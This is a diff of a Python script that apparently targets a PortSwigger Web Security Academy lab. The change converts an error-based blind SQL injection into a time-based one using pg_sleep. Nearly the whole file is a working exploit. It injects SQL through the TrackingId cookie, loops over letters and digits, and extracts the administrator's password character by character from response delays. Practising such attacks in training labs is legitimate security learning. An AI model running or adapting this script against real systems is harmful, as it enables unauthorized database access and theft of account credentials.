@@ -9,7 +9,7 @@ trackingId ="FV1TanKwqLFHEpDX"
 session = 'vzmsExc9JpX8YBKIEuDr9dlVOrl2lYwV'
 
 cookies = {
-    'TrackingId': "FV1TanKwqLFHEpDX'%7c%7c(SELECT%20CASE%20WHEN%20(SUBSTR(password%2c1%2c%201)%3d'b')%20THEN%20TO_CHAR(1%2f0)%20ELSE%20NULL%20END%20FROM%20users%20WHERE%20username%3d'administrator')%20--",
+    'TrackingId': F"{trackingId}'%3bSELECT%20CASE%20WHEN%20(username%3d'administrator'%20AND%20SUBSTRING(password%2c1%2c1)%3d'a')%20THEN%20pg_sleep(2)%20ELSE%20pg_sleep(0)%20END%20FROM%20users--",
     'session': session,
 }
 
@@ -19,47 +19,41 @@ headers = {
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
     'Accept-Language': 'en-US,en;q=0.5',
     # 'Accept-Encoding': 'gzip, deflate, br',
-    'Referer': F'{host}/filter?category=Pets',
     'Upgrade-Insecure-Requests': '1',
     'Sec-Fetch-Dest': 'document',
     'Sec-Fetch-Mode': 'navigate',
-    'Sec-Fetch-Site': 'same-origin',
+    'Sec-Fetch-Site': 'none',
     'Sec-Fetch-User': '?1',
     # Requests doesn't support trailers
     # 'Te': 'trailers',
-    # 'Cookie': "TrackingId=FV1TanKwqLFHEpDX'%7c%7c(SELECT%20CASE%20WHEN%20(SUBSTR(password%2c1%2c%201)%3d'b')%20THEN%20TO_CHAR(1%2f0)%20ELSE%20NULL%20END%20FROM%20users%20WHERE%20username%3d'administrator')%20--; session=vzmsExc9JpX8YBKIEuDr9dlVOrl2lYwV",
-}
-
-params = {
-    'category': 'Food & Drink',
+    # 'Cookie': "TrackingId=sNg4KmagaG8A1IQW'%3bSELECT%20CASE%20WHEN%20(username%3d'administrator'%20AND%20SUBSTRING(password%2c1%2c1)%3d'a')%20THEN%20pg_sleep(2)%20ELSE%20pg_sleep(0)%20END%20FROM%20users--; session=xjmVBBwjL8kiitabFl3zkgjy4f5oicSD",
 }
 
 # Intruder code:
 
 c_table = string.ascii_lowercase + string.digits
-current= ""
+current = ""
 password = ""
 
-for i in range(1,21):
+for i in range (1,21):
   
   for c in c_table:
-    t = F"{trackingId}%20'%7c%7c(SELECT%20CASE%20WHEN%20(SUBSTR(password%2c1%2c%20{i})%3d'{current+c}')%20THEN%20TO_CHAR(1%2f0)%20ELSE%20NULL%20END%20FROM%20users%20WHERE%20username%3d'administrator')%20--"
-    cookies['TrackingId'] = t
+    t = F"{trackingId}'%3bSELECT%20CASE%20WHEN%20(username%3d'administrator'%20AND%20SUBSTRING(password%2c1%2c{i})%3d'{current+c}')%20THEN%20pg_sleep(2)%20ELSE%20pg_sleep(0)%20END%20FROM%20users--"
+    cookies['TrackingId']=t
     response = requests.get(
-      url,
-      params=params,
+      'https://0a420073037936b180934ee600420080.web-security-academy.net/',
       cookies=cookies,
       headers=headers,
       verify=False,
-      )
-    
-    if 'Error' in response.text:
+    )
+
+    if (response.elapsed.total_seconds() > 2):
       current+=c
       print(current)
       break
 
-  if password == current:
-    print("PASSWORD: ", password)
+  if (password==current):
+    print("PASSWORD: ",password)
     break
   else:
     password = current
